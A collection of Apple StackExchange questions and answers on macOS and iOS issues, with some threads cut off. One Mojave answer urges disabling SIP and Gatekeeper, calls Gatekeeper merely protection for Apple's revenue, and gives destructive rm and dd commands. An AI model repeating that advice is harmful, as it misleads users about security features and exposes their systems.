(Or just that the exception / preference elected for that missing app is showing in the settings app in your case.)\nThose long identifiers just are the behind the scenes value assigned to the application when the developer made a request to Apple to make a new app. You normally see the localized name of the application once it downloads, but apparently Apple doesn’t save the app name in iCloud backups - just the identifier so that’s what’s left to display.\nYou can remove those apps from iCloud data or see if you have the applications on a computer backup to re-transfer them back if needed.\nI would consider this a bug that Apple might choose to patch, and not something you have a functional defect - just remove the permissions if you are worried. Worst case, the app comes back and you have to re-grant those permissions once you know which app actually needs those permissions.\n", "Q: Minimizing the use of APFS in Mojave by putting Users and Applications on HFS+ I'm wondering if it would be possible in Mojave to move the Users and Applications folders to separate HFS+ partitions without breakage? E.g. doing this or something similar:\n\n*\n\n*Symlinking an app folder on a HFS+ volume directly to /Applications or to a subfolder of it\n\n*Symlinking a Users folder on a HFS+ volume directly to /Users\n\n*...or just specify users' folders individually in system settings, pointing to a HFS+ volume\n\nThe goal is to minimize the surface area of APFS, which has proven to be too unreliable for me after I was forced to do two complete reinstalls of the OS in one week when APFS got corrupted -- twice -- and did not repair itself.\nReinstalling the OS is relatively quick compared to restoring from a time machine backup and redownloading lots of large apps, so I thought that if I could isolate most of my data onto HFS+ I would save time if for some reason I decide to upgrade from High Sierra to Mojave again. The next time APFS decides to make the entire volume inaccessible and the OS unbootable I would then only have to reinstall Mojave and link in the existing directories.\nRelated questions\n\n*\n\n*Can I move Applications to another partition?\n\n*How to make the Users Directory a different partition in Snow Leopard?\nWhy is this question not a duplicate? This deals with Mojave, which is known to be unnecessarily picky about file systems.\n\nA: Consider that if APFS reports checksum errors, and you reformat and reinstall, and the same thing happens again after a short while - then you could very well have a failing storage medium.\nInstead of relocating various folders to a partition formatted with HFS+, it would be wise to thoroughly check your drive for errors and possibly replace the drive.\n\nA: The user home folder is very portable - you can place it anywhere - on network volumes even in many cases. Same with Applications - they write preferences to the main library, the main temp folder(s) and the user library, but they can exist anywhere you prefer in addition to the typical locations of the apps folder in the root and in the user home.\nI’m skeptical you’ll see any benefit and might see less functionality and speed, but absolutely make a good backup and then start making other places to store files that let you learn or control things apart from APFS being the main container for everything added to the core system.\nNothing in Mojave changes the above - you may not be able to delete the default locations, but everything that isn’t SIP protected (all the apps you add later for instance) are highly portable.\nYou will struggle migtily if you move things the system wants in /Applications and each security patch and update will break as well since they depend on the locations being left alone for system apps and frameworks.\n\nA: It's seems like OP has things all figured out. But just to clarify for future users that stuck with- or were stuck on Mojave: yes, /Applications can be symlinked to another drive/place. I guess it should go without mention that it should be available at boot time without networking, unlike home directories.\nHere's how it's done. It is also meant for users in Mojave (still, in 2023).\n\n*\n\n*Boot from the recovery system partition or installer media/partition, even if the version doesn't match Mojave's (somewhat decent APFS support is needed though, so an installer no older than High Sierra):\n\n*\n\n*On Macs with an  keyboard you can just hold ⌥ even before restarting/powering the Mac and it will work. If you don't have an  keyboard though, it is a trickier two part process: press [first] any other key(s) for it to connect (assuming it's wireless)3. It might need more than one keypress for it to link up. Usually there is no indication this has happened. On the second part then press the ⌥/Alt but not before it starts receiving signal, in  devices such as the Thunderbolt Display the backlight comes on (screen goes from black to   blank), in non- devices the power LED usually changes color or the sleep indicator turns off if there's one. It has to be right before or at the very start of the boot chime and definitely before the Apple logo shows up. If it shows up you were too late. Try different timings, if you can't get it, then {2.} otherwise select the recovery system to boot from it.\n\n\n*Hold ⌘⌥PR (or Win/SuperAltPR) → power → continue holding. It will take longer for the chime then it will reboot on its own → continue holding → reboot on its own. At least three cycles if your machine is older (it probably is). Now, it should be easier to get to the boot manager screen (1.)\n✓ You can go directly to the recovery system holding ⌘R, or, if your system doesn't have a recovery partition or installer media: ⌥⌘R for Internet recovery. This gets the original version that came with your system, so it might not work after all (because of APFS compatibility). It will take a while, it doesn't matter if you're on gigabit fiber or ADSL, Apple's servers are slow.\n\n\n\n\n*Wait for the macOS Utilities window (with Time Machine, Install, Disk Utility…). Ignore them and go to the Terminal from the Utilities menu.\n\n\n*Disable SIP: csrutil disable\n\n\n*Get aquainted with the volumes (what's mostly understood as a disk in a live system): ls -laFhG /Volumes1\n✓ You can quit(⌘Q) the terminal right there, then launch Disk Utility from the Utilities window (which reappears) and compare what you just saw if you need a visual of things. ⌘Q and get back to the terminal.\n✓ Your system is not macOS Base System as tempting as it may sound, that's the current system which maps to /. Just like Macintosh HD or macOS or whatever-you-renamed-it to / in your normal system, thus, /Applications should be in /Volumes/Macintosh\\ HD/Applications. If there are spaces or other special characters in the name, press ⇥ after a few characters to complete the name with the correct escaping, ⇧⇥ if you shoot past it to go in reverse. It is still case-sensitive, so watch out for that as well. (…acOS/app⇥ will not complete …acOS/Applications while …acOS/App⇥ will)\n✓ To help you ID it you can rename you system's main volume to something silly so it stands out. However, the disk (volume) where you'll be moving /Applications to must stay put once you symlink to it since its name is part of the path. Changing it will break it, whereas in the main volume macOS does voodoo to keep the relationship of / to it so you can rename it a live system.\n\n\n*Copy (don't move) /Applications with cp, ditto, etc… e.g;\n\n*\n\n*cp -fR /Volumes/macOS/Applications /Volumes/HFS\\ Storage\n\n*cp -fR /Volumes/macOS/Applications/* /Volumes/HFS\\ Storage/Applications\n\n*ditto /Volumes/macOS/Applications /Volumes/HFS\\ Storage\nQuick reminders/notes\n✓ Observe the difference when there's a trailing \"/\":\n\n*\n\n*\n\n*\n\n*copies the directory to a new parent directory under which it will be recreated\n\n\n\n*\n\n\n*copies (most of) the contents of the directory, to a preexisting directory.\n\n\n\n✓ \"*\" won't match all files, therefore it's best to copy the parent directory, not its contents.\n✓ .app files are directories disguised as single files. -R must always be specified when cping one.\n✓ macOS' ditto (3.) needs no options and makes exact copies (attributes, permissions, link types…). Syntax is the same as 1.\n✓ Use ⇥ to complete filepaths (and double-check) as much as you can to avoid mistakes.\n\n\n*⌘N to open a new terminal window and navigate to the path to compare side by side.\n✓ All the extra options (-laFhG) to ls will come in handy.\n\n\n*Delete the original /Applications folder. Leaving only the fresh copy in another drive. Create a symlink to it called exactly as the recently deleted file (full path from something to something to /Applications) and you're done:\n✓ [in 2 commands] the syntax is the same as cp's except instead of copying the file, a (symbolic, soft or sym)link to it is created, using the locations from the examples above, the syntax would be: ln -s /Volumes/HFS\\ Storage/Applications /Volumes/macOS, but first rm -fR /Volumes/macOS/Applications is needed to make room for it.\n✓ [in 1 command] Alternatively, in a single command: ln -sF /Volumes/HFS\\ Storage/Applications /Volumes/macOS.2\n✓ These commands have a verbose option (-v for cp, -V for ditto and -v for directories only in ditto4) if you get anxiety it might not be doing anything specially in such a large directory. Keep in mind the systems needs to be artificially slowed so it manages to print every lined from every files copied. The difference is small, but it is not insignificant.\nOther notes:\nrEFInd\nAs your Mac gets older, resetting the PRAM and SMC — usually in tandem — will be needed more often; this also re-enables SIP, needing you to go into recovery again to run csrutil disable in the terminal (you can check it's status in a live system with csrutil status BTW).\nA quicker alternative to this is a rEFInd flashdrive which has a quick SIP toggle button without needing to boot into any OS at all.\n\n*\n\n*It's not the rEFInd that you install on the ESP or on an HFS+ partition, those don't have the option, but\n\n*You can use both simultaenous, they'd even detect one another and you can switch between them.\n\nYou Mac at this point, let's face it, it's an older Mac if it's running Mojave, there's a high chance you're not using the SD card reader, which makes an excellent rEFInd flash disk that's you'll never confuse with a million USB flash drives much more commonly used. Creating it is as easy as dc3dd or dd if=~/Downloads/refind-flashdrive-0.13.2/refind-flashdrive-0.13.2.img of=/dev/disk4. Takes like 5s.\nGatekeeper\nSince you made it this far already, why not just going all in, it's clear you can tend for yourself and don't need Apple to \"protect you\" if you're messing with system file structures. Get rid of Gatekeeper: spctl --master-disable. The only protection it gives is to Apple from prevemting devs to getting software in your system that circumvents paying their annual developer fee and submitting their source code for its literal blessing — a pretty good incentive for devs not to develop for macOS, case in point uBlock Origin for Safari, or ProfileCreator used heavily in the enterprise because it completely eclipses Apple's Apple Configurator 2. Only the opportunistic, subscription-demanding, microtransaction-loving vultures are left there.\nThis is done as root with SIP disabled. To confirm, ˝Allow app downloaded from: Anywhere\" in System Preferences→ Security & Privacy→ General should be set and impossible to be changed. If you're are on that System Preferences pane, it won't change until you exit it and enter it again. There is no need to reboot.\nFWIW, the presence of Gatekeeper is not that noticeable until you've experienced its abscense.\nComplement with MDM or configuration profiles\nDroping a folder in Login Items might be good enough for casual use of a resource, but if something is critical, say, your Mac is an automation controller, that just won't cut it. You need to script it or command it from a profile or MDM server. If you happen to have purchased Apple's macOS Server (Server.app) way back when, its ProfileManager component (its only component in the case of Mojave) can do a lot of this and change it on the fly (you'll also need another mac to be the server). ManageEngine has a free tier for around 20 devices but it's not very fine-tuned control. Apple Configurator 2 or ProfileCreator (look for it on GitHub) are good options too, updating profiles on the fly is no longer an option though.\n\n  1: ls options\n      l = view as table\n      a = include dot files, all files\n      F = append type indication where:\n      / = for directories and\n        @ = symlinks (those are all you need for now)\n        h = \"use filesize multipliers (kilo-, mega-, tera-…) instead of \n            long ass numbers.\" reads verbatim the manpage, if you change \n            some or all of the words.\n      G = use color\n  2: Personally, I've had issues with this form not working (nothing\n     happens), so I end up deleting then symlinking anyway, but I have \n     not tested in the environment these commands need to be executed \n     where there are zero safeguards preventing the user from anything\n   ( except  installing   from an old installer  w/o  having to change\n     the date  because this is still an Apple product designed against\n     you using  it for  too  long  w/o feeling  you  need  the newest. )\n  3: keyboards that connect through a dongle lose their connection when the\n     dongle loses power (temporarily during reboot).

On my system, I'm trying to set up SSH authentication through my GPG agent (installed via brew). So far, I have this working in my terminal thanks to adding the following lines to ~/.profile:\n# Enable SSH support through GPG\nexport \"GPG_TTY=$(tty)\"\nexport \"SSH_AUTH_SOCK=${HOME}/.gnupg/S.gpg-agent.ssh\"\n\nHowever, GUI applications (e.g. PyCharm) still use the SSH agent built into Mac (annoyingly). Is there any way/place I can use to set my SSH_AUTH_SOCK for my entire session? Ideally, I don't want to disable SIP to achieve my goal, and solutions like this don't seem to work. \nFor example, running import os; os.environ['SSH_AUTH_SOCK'] in PyCharm's builtin Python Console will still show /private/tmp/com.apple.launchd.whatever/Listeners instead of my auth sock. Likewise, it will not prompt for my GPG key passcode but instead go through the standard authentication flow.  \nThis also persists in XCode, using a small sample program to get the value of SSH_AUTH_SOCK, so it's not PyCharm or a Python-only problem.\nI'm currently running Mojave 10.14.4 on my system.\n\nA: So, I managed to find a hacky solution that achieves the same goal. It appears (???) impossible to overwrite SSH_AUTH_SOCK, and I can't disable the builtin agent because I want to preserve SIP.\nHowever, I can abuse symlinking to get my agent working reliably. Thanks to a nice article explaining how to leverage the YubiKey on a Mac (similar to my goal), I managed to create a LaunchAgent to symlink my agent to wherever SSH_AUTH_SOCK is pointing. So far I have yet to perform heavy testing with this, but it seems to be working okay.\nJust in case the source link goes down, I created a file at ~/Library/LaunchAgents/link-ssh-auth-sock.plist with the following contents:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs>\n<plist version=\"1.0\">\n<dict>\n  <key>Label</key>\n  <string>link-ssh-auth-sock</string>\n  <key>ProgramArguments</key>\n  <array>\n    <string>/bin/sh</string>\n    <string>-c</string>\n    <string>/bin/ln -sf $HOME/.gnupg/S.gpg-agent.ssh $SSH_AUTH_SOCK</string>\n  </array>\n  <key>RunAtLoad</key>\n  <true/>\n</dict>\n</plist>\n\nThis LaunchAgent replaces the Apple-generated socket (located in /private/tmp/...) with my own, but preserves Apple's environment variable. The symlink works, and is picked up in any application that supports using native SSH (in my case, PyCharm).\nIt's not a true solution to the issue (the socket is being symlinked, who knows what issues this could cause), but it at least works for the time being.\nI'll keep trying to find a true solution to this problem, but in the meantime I'll share this answer just for any other curious souls with the same issue.\n", "Q: Is it possible to fix the spacing when using \"ls\" with colored output? This is the exact same issue found here:\nhttps://unix.stackexchange.com/questions/165154/changing-the-spacing-between-files-in-ls\nWhen you run the command ls -G or CLICOLOR=1; ls the spacing in the output gets squished. \nThese images demonstrate what's going on (taken from the old thread):\nRunning ls when CLICOLOR is unset or set to 0:\n\nRunning ls -G:\n\nThis happens in any terminal emulator (terminal.app, iterm, kitty) and any shell (bash, zsh).\nAs the commenter points out in the previous thread, this is caused by ls -G setting f_notabs=1.

I can't find any information on this since 2014.\nObviously this isn't the end of the world, but ls is one of the most frequently called shell commands and being able to have both color and nice spacing makes things easier to read. I am surprised there seems to be very little written about this as I would expect it to impact a large number of people.\n\nA: If your using Terminal or iTerm you can go to preferences and look for option to change fonts. For iTerm its shown in the image below.\n\nIf you click on the change font button you get the following pane.\n\nAs you can see in this image there are sliders to adjust the character spacing. you can spread the characters out on the iTerm windows.\n\nA: You could use a different program.\nOne comment on your linked question suggests using homebrew to install GNU Coreutils.  Alternatively you could simply download it from here, unzip it and can compile it with:\ncd ~/Downloads/coreutils-8.31\n./configure\nmake\n\nYou then get a version of ls that formats output for color and monochrome the same.  If output will fit on one line with two spaces between names it prints it irrespective of color setting.\n\nThe macOS version (in color mode) conversely works out the longest name and pads the others to be the same length (plus one) which is why I have one space after Documents and five after Music. This does look a bit messy but you'd have to alter the program to change this behavior. \nThis is seen more clearly here:\n\nNote that if the window is too narrow to fit the information on one line then both wrap:\n\nThe main issue with replacing the program is the macOS ls and GNU ls don't have the same options.  For example -G on macOS version means \"Enable color output\" while on GNU version it means \"in a long listing, don't print group names\"\nWhether getting consistent layout for color and monochrome in exchange for different options is a matter of opinion.\n", "Q: How to find program's Application Support folder I am wondering if there is a way to get the name of a program's Application Support folder, perhaps in a way similar to get the id of an app.\nosascript -e 'id of app \"Sublime Text\"'\n\ngives you com.sublimetext.3 which is the name of the Caches folder but the name of the Application Support folder is Sublime Text 3\nIs there a way to do with osascript or something else?\n\nA: AFAIK, applications can name their Application Support folder whatever they want—there's no requirement that it be the name or bundle id of the app. Heck, there's also no requirement that it be stored in ~/Library/Application support—an app could save all configuration data to your Desktop if it wanted to.

In Chrome when it's full screen it takes you to a new tab but disables the location keyboard shortcut.\n\nI suspect this has to do with how full screen is actually implemented.

Look for key labelled F4 on your keyboard.\n\nIf you are using a non-Apple keyboard, go to System Preferences → Keyboard → Shortcuts → Launchpad & Dock and select the checkbox next to Show Launchpad. You can also double click on the keyboard shortcut and change it to something else.\n\nYou can also define custom keyboard shortcut(s) easily by going to System Preferences → Keyboard → Shortcuts. Since you are essentially looking for single key to invoke the desired operation(s), you can do so by creating a single key shortcut (if not natively provided by macOS).\n\nUpdate: Recent generation of Mac desktop and portable keyboards no longer provide pre-programmed key for invoking Launchpad. In such a case, you can define a keyboard shortcut for the same by following the instructions above.

Then erase the HDD. Then have the HDD replaced with a new internal SSD. Then restore from Time Machine.\nShould I take precautions for the simultaneous switch from non-APFS to APFS? For example, must I convert the HDD to APFS before the steps mentioned above?\n\nA: No, you don't need to convert the HDD. I recently did exactly what you're doing (though I installed the new SSD myself, which meant not having to worry about erasing the HDD) and didn't have to do any conversion.\nBut, just to be on the safe side, it would be smart to not only make sure you have a Time Machine backup but also clone your HDD to a different drive than the one that has your Time Machine backup. That way if, for whatever reason, you have a problem with restoring from the Time Machine backup, you have a fall-back plan. Better safe than sorry. You can clone the internal HDD to a second drive using Apple's Disk Utility or something like Carbon Copy Cloner. Instructions are readily available.\nThe other thing I'd suggest is that instead of simply restoring everything from your Time Machine backup to the new SSD you do a clean installation of macOS onto the new drive and then just restore your files and data using Migration Assistant. That way you get the benefits of a fresh OS installation along with the benefits of your new SSD.\n\nA: No - I wouldn’t do anything for the HFS -> APFS transition if you are on an SSD. This has been vetted for months across many architectures and as long as you have a backup of the data, proceed.\nI wouldn’t make any upgrade without a backup, so YMMV if you go without recent backups - any change at that point might not be worth the risk - even letting the system run is a risk if you have no backups and would want any of your time or data back when it inevitably gets corrupted or fails.\nMy recommendation would be to move all the data to the SSD using an external bus connection and test that restarting to it works before you open the hardware and do any swap. Lots of people put the SSD in and then try to worry if the part is tested or the cables are correct. Do all the testing and data migration before you put in the drive is my main advice.\n\n\n*\n\n*Install the OS you want on the external SSD.\n\n*Run Migration Assistant to move all the apps and data to the SSD (when booted off the SSD).\n\n*Test things with the SSD running everything. Including set up backup of the new SSD to whatever destination you want for Time Machine.\n\n*Run for a week - letting the internal HDD just be there, not even mounted if you prefer.\n\n*Do the swap SSD for HDD.\n\n", "Q: Large external storage stops working after being connected for a long time I have a 4 TB LaCie RUGGED USB-C external hard drive, and when it's connected to my MacBook Pro (13-inch mid 2014) for a long time without being used, it stops working.

I recently upgraded my mid 2011 Mac mini to macOS High Sierra. I purchased the Magic Mouse 2 about a year ago, but really loathe the charging port on the bottom (unbelievably stupid design, but I digress). As such, I kept my old (original) Magic Mouse handy for when I needed to charge the Magic Mouse 2. I never had problems with this use case in OS X El Capitan. \nHowever, today when I tried to use the old Magic Mouse, macOS absolutely freaked out and neither of the Bluetooth mice could connect. I had to use a generic Logitech USB mouse to \"forget\" both of them (old and new), then I could reconnect the Magic Mouse 2 after it charged. \nSo my question: is the original Magic Mouse unsupported in macOS High Sierra? (edit: it definitely is supported, not the issue). Or perhaps I simply can no longer use the Magic Mouse and Magic Mouse 2 interchangeably? \nUpdate 1: Forgetting and re-pairing both of the the mice was a temporary fix. Nothing else worked, including rebooting. \nUpdate 2: Issue has returned. I again had to fight macOS tooth-and-nail to get the Magic Mouse 2 paired after using the Magic Mouse!\nUpdate 3: One thing I forgot to mention: when the Magic Mouse 2 has lost pairing (after using the Magic Mouse) and I plug it in and switch it on, the \"Mouse\" section of System Preferences goes absolutely berserk, rapidly alternating between the normal screen and the \"looking for bluetooth mouse\" screen. \n\nA: I cannot find any Apple documentation stating that the original Magic Mouse is unsupported in newer OS versions. \nYour problem is more likely to be just one of Bluetooth connectivity. Apple provides a troubleshooting document that describes the Magic Mouse and Magic Mouse 2 together. Other remedies for problems can be found here.\nThe Magic Mouse is not one of Apple's strongest designs, and you may prefer a third-party mouse, or the Magic Trackpad, which I find much better.

Getting the machine to the parts is easier and cheaper than making an appointment and the stores often just send these out so you don’t save time for this repair.\nGood luck - be sure to make an answer with what you do - the above is general advice and might or might not be the best for you.\nThere is almost always enough residual power a day or two after the machine shuts off for a SMC reset and if the battery goes completely flat, that too resets the SMC in a way since it cold starts when the trickle charge returns. Also, be sure you can’t try a different charger if it’s just that.\n\nA: I don’t think there’s a “power light” on the 2017 MacBook.\nTry connecting the charger and letting it charge for 30 minutes. With it still connected, hold the power button for 15 seconds. Let it charge for another 30 minutes. Then try to power on. Hopefully that will get you going.\n", "Q: How to run bookmarklet in Safari on iOS With Chrome, the only way I can run a bookmarklet is by typing the bookmarklets name into the address bar and then clicking the suggested result. In Safari on iOS, it displays a result saying that JavaScript cannot be run from the address bar. I don't have access to an iPhone that I can continue to use to test the bookmarklets I write, but I attempted running it from the bookmarks menu in Safari and it didn't do anything.\nHow do I run bookmarklets on iOS in Safari?\n\nA: Apart from opening Safari manually and selecting the bookmark from your favorites, you can also pin it to your homescreen were you can tap the icon and it'll open Safari for you and run the Javascript. Although for that you need to use a slightly different address.\ndata:text/html,<script>alert('test')</script>\n\nVisit the above and after the page is loaded you can then tap share and select pin to homescreen. After that you can just tap the icon.\nThose are the only two ways to run JS/HTML script.\n", "Q: Can we view or edit HostName value via macOS desktop UI? Here are two instances where I found that setting the computer name via System Preferences > Sharing > Computer Name does not really set the HostName attribute.\nThe macOS version is macOS High Sierra version 10.13.6 in both instances below.\nInstance 1\nI got a brand new MacBook Pro which had the following settings under System Preferences > Sharing.\n\n\n*\n\n*Computer Name: Lone's MacBook Pro\n\n*Local Hostname: Lones-MacBook-Pro.local\n\n\nThe scutil and hostname output looked like this:\n$ scutil --get ComputerName\nLone's MacBook Pro\n$ scutil --get LocalHostName\nLones-MacBook-Pro\n$ scutil --get HostName\nHostName: not set\n$ hostname\nLones-MacBook-Pro.local\n\nThen I went to System Preferences > Sharing and set the Computer Name to luke. Now the output looked like this:\n$ scutil --get ComputerName\nluke\n$ scutil --get LocalHostName\nluke\n$ scutil --get HostName\nHostName: not set\n$ hostname\nluke.local\n\nThe HostName attribute is not set!\nInstance 2\nI was working on a friend's MacBook Pro who had some other HostName already set (perhaps someone else had configured it for him). He had the following settings under System Preferences > Sharing.\n\n\n*\n\n*Computer Name: mmod\n\n*Local Hostname: mmod.local\n\n\nThe CLI output looked like this:\n$ scutil --get ComputerName\nmmod\n$ scutil --get LocalHostName\nmmod\n$ scutil --get HostName\nmmod\n$ hostname\nmmod\n\nNow I went to System Preferences > Sharing and set Computer Name to luke. The output now is:\n$ scutil --get ComputerName\nluke\n$ scutil --get LocalHostName\nluke\n$ scutil --get HostName\nmmod\n$ hostname\nmmod\n\nAgain, HostName remains unaffected.\nQuestion\nI know that I can set the HostName attribute with the scutil --set HostName luke command.\nMy question is: Is there a macOS desktop UI element where I can view or edit this HostName attribute without having to run CLI commands?\n\nA: There's no place in the GUI to change it, because it's typically set by an external source.\nYour hostname is determined by the following (in order):\n\n*\n\n*name supplied by DHCP/BOOTP server\n\n*name returned by a reverse DNS lookup\n\n*the localhost name (what was used to set LocalHostName value)\n\n*name acutal name localhost\nMost routers now have the ability to \"register\" the DHCP lease in the DNS resolver cache.  So, what's happening is this...\nAt some point, your Mac didn't exist as a DHCP mapping or DNS entry on your router.  When it connected, it sent a request which included it's preferred hostname along with a request for an address.  That preferred hostname defaulted to your LocalHostName as the first two conditions would have returned nothing.  When you got the address, it \"registered\" that hostname with an IP.\nNow, you want to change the name, but it keeps coming back to the original host - this is because the router now \"knows\" your machine has having that name and will overwrite it per DNS (which takes priority).\nTL;DR\nThat name is coming from your DHCP Server and/or DNS chache.  If you want to clear that out and set a new one, you'll have to do it at the router.\n\nA: Untested but according to this articled titled: How to Change Your Computer Name on Mac OS X you can change the hostname under the System Preferences.\nUnder the Sharing Menu\n\nYou can click the Edit button and change the hostname\n\nAfter make the above change, you'll want to make sure and restart the terminal so that the above change gets picked up.\nNOTE: The above should have the same effect as doing this:\nIn addition to your method of using the CLI:\n$ sudo scutil --set HostName [NewHostNameHere]\n\nReferences\n\n\n*\n\n*Set the hostname/computer name for macOS\n", "Q: One of the processes keeps sending a keystroke repeatedly in the background, how to identify the culprit? My system is a MacBook Pro late 2013 running macOS Sierra 10.12.6.\nSymptoms:\n\n\n*\n\n*Occasionally after the laptop wakes from sleep, the system would behave as if someone is repeatedly pressing a certain key on the keyboard.\n\n*If I click anything (Apple icon, File, Edit...etc) on the menu bar, the item whose name starts with A will be highlighted repeatedly, B if nothing starts with A, and so on. (Therefore, I assume the keystroke being sent is a number.)\n\n*If I press cmd+tab attempting to switch between apps, the focus will automatically scroll all the way to the right-most item.\n\n*This doesn't affect all apps. I am able to use Chrome as if there's nothing wrong.\nMy question:\n\n\n*\n\n*Apparently one or more of the processes running on my system is doing this. To find out which process / app is sending the keystroke, I am looking for a way or a tool to monitor who is sending keystroke. Therefore next time this happens I can use this to determine the culprit.\n\n\nThanks!\n\nA: It turned out that the culprit was Karabiner-elements, and the issue has been resolved in the latest update.\nhttps://github.com/tekezo/Karabiner-Elements/issues/1828\nhttps://pqrs.org/osx/karabiner/history.html\n", "Q: MacOS 10.14.4 update failing to fully load and cycling through boot attempts but not loading requiring full recovery Noobie here.  I have tried to update my iMacPro Desktop to MacOS 10.14.4 and each time I do so it stalls part way through the update process and loops between Boot and Shut Down.  Each time this happens my only option is to fully recover the machine from a full backup in Time Machine.  All advice gratefully received.\n\nA: I got it to load properly by entering Disk Utility and running First Aid on the HD (instead of going to the full recovery mode as I had been doing)and then when I rebooted it booted into 10.14.4 all AOK!!\n", "Q: Mac slow after migration I just restored my old Late 2009 27\" Quad core iMac, from Time Machine to a Late 2012 21\" i5 iMac, and at certain points it is very slow and laggy.

I already installed the newest OS which seems to have helped.\nCan anyone please let me know what might be the best solution, or general steps which should be taken in this case.\n\nA: It can take a while for a Mac to reindex all your files after an OS upgrade. Leave it powered on and mostly idle for a day or two, especially if your disk is nearly full. That will give it time to complete its background tasks.\n", "Q: Move Photos and Videos from an iPhone 4 to PC I have an iPhone 4 that does not update anymore, works deadly slow, and has zero free space on it. For some reason (subject for another question), I has to use it and, to make using it more comfortable, I want to free some space.\nI found that decent amount of space is occupied by photos and videos, that I cannot afford to loose, so I want to move these photos and videos to PC, i.e. to copy them from iPhone to PC, and then remove them from iPhone.\nI've connected iPhone to PC via USB cable, and Windows (I also have MacBook, but tried on Windows; let me know, if on MacBook my task is easier to solve) recognized it as external USB drive with two folders:\n\n\n*\n\n*one folder named DCIM, and\n\n*another named something like File Transfer\nIn these two folders there were more than a hundred photo and video files. I successfully moved all of them to PC, so now, Windows does not see any files on iPhone.\nThe problem is that iPhone still has zero free space and if I tap on Photo icon in it, I still see lots of photos and videos there.  So my goal was not achieved.  I don't know whether photos I still see on iPhone and photos I now have on PC are the same or not.\nCould you help me?\n\nA: You need a way to transfer original photos and videos from your iPhone to your PC. First copy/import them from your iPhone to Windows, then proceed to delete them from within the Photos app on your iPhone.\nTo copy/import using a Mac, connect your iPhone to your MacBook, and use a macOS built-in app called Image Capture. Upon launching, Image Capture will list your iPhone in the left pane. Selecting it will display all the photos and videos available on your iPhone. Simply select the desired ones and drag them into a folder of your choosing to copy them to your Mac. Once copied, you can also delete them from the iPhone using the Image Capture app.\nFor computers running Windows, you can download a 3rd party app called iExplorer to easily browse through and transfer all your photos and videos from your iPhone to your PC.\nDevelopers of iExplorer have shared a tutorial article listing instructions on how to transfer photos from your iOS device to PC:\n\n\n*\n\n*Copy Photos from iPhone or iPod to PC or Mac\nNote: No affiliation whatsoever to the developer of iExplorer.\n", "Q: Trapped in iPhone 4 and WhatsApp, need help to escape I have an iPhone 4 with WhatsApp messenger installed.
